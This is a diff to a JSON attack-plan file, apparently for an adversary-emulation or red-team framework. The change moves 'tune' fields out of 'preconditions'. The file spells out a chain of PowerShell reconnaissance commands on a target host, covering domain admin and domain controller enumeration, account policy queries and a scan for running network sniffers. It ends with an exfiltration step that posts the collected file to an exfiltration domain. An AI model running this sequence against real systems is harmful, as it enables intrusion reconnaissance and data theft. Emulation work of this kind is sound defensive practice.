@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -65,7 +70,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -76,7 +82,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -86,10 +93,10 @@
                 "actuator_id": "self.actuator",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -99,10 +106,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{tasklist /svc >${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{tasklist /svc >${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -112,10 +119,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v SystemManufacturer >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v SystemManufacturer >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -125,10 +132,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v SystemProductName >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{reg query hklm\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation /v SystemProductName >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -138,10 +145,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{reg query hklm\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 /v ProcessorNameString >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{reg query hklm\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 /v ProcessorNameString >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -151,10 +158,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{arp -a >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{arp -a >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -164,10 +171,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{nbtstat -n >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{nbtstat -n >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -177,10 +184,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{net config workstation >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{net config workstation >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -190,10 +197,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{ipconfig /all >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{ipconfig /all >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -203,10 +210,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{route print >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{route print >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -216,10 +223,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{tracert -h 10 yahoo.com >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{tracert -h 10 yahoo.com >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -229,10 +236,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{net view >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{net view >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -242,10 +249,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{net view /domain >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{net view /domain >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -255,10 +262,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{net group \"Domain Computers\" /domain >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{net group \"Domain Computers\" /domain >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -268,10 +275,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{net group \"Domain Controllers\" /domain >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{net group \"Domain Controllers\" /domain >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -281,10 +288,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{net group \"Exchange Servers\" /domain >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{net group \"Exchange Servers\" /domain >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -294,10 +301,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{netstat -an >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{netstat -an >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -307,10 +314,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{tasklist /v >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{tasklist /v >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -320,10 +327,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{net localgroup >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{net localgroup >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -333,10 +340,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{net localgroup Administrators >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{net localgroup Administrators >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -346,10 +353,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{net group \"Domain Admins\" /domain >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{net group \"Domain Admins\" /domain >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -359,10 +366,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{gpresult /z >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{gpresult /z >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -372,10 +379,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{systeminfo >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{systeminfo >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -385,10 +392,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{set >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{set >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -398,10 +405,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{fsutil fsinfo drives >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{fsutil fsinfo drives >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -411,10 +418,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{net time >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{net time >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -424,10 +431,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{net accounts >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{net accounts >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -437,10 +444,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{net accounts /domain >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{net accounts /domain >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -450,10 +457,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{Get-Process | Select-String 'msmp|tcpdump|windump|ethereal|wireshark|ettercap|snoop|dsniff' >>${self.target_1_temp_file}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{Get-Process | Select-String 'msmp|tcpdump|windump|ethereal|wireshark|ettercap|snoop|dsniff' >>${self.target_1_temp_file}; echo \" \"}"
             }
         },
         {
@@ -465,7 +472,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1",
                 "target_2": "self.target_2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Exfiltration",
@@ -475,10 +483,10 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
-                "exfil": "self.exfil",
-                "tune": {
-                    "command": "powershell &{Invoke-RestMethod -Uri${self.exfil_domain}/ -Method Post -InFile${self.target_1_temp_file};echo \" \"}"
-                }
+                "exfil": "self.exfil"
+            },
+            "tune": {
+                "command": "powershell &{Invoke-RestMethod -Uri${self.exfil_domain}/ -Method Post -InFile${self.target_1_temp_file};echo \" \"}"
             }
         },
         {
@@ -489,7 +497,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
